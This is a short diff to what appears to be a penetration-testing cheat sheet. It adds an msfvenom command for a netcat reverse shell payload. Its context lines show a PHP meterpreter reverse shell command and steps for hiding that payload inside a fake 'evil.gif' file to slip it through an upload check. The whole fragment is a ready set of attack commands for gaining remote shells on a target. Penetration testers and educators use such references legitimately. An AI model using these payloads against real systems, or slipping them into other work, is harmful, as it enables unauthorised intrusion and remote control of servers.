@@ -573,6 +573,10 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 #### generic meterpreter php reverse shell code [msfvenom]
 `msfvenom -p php/meterpreter/reverse_tcp lhost='host_ip' lport='port' -f raw`
 
+#### netcat reverse shell [msfvenom]
+
+`> msfvenom -p cmd/unix/reverse_netcat lhost='ip' lport='port' R`
+
 #### crate a php reverse shell in a evil gif file for upload
 	> echo GIF98 > evil.gif
 	> msfvenom -p php/meterpreter/reverse_tcp lhost='ip' lport='port' >> evil.gif´
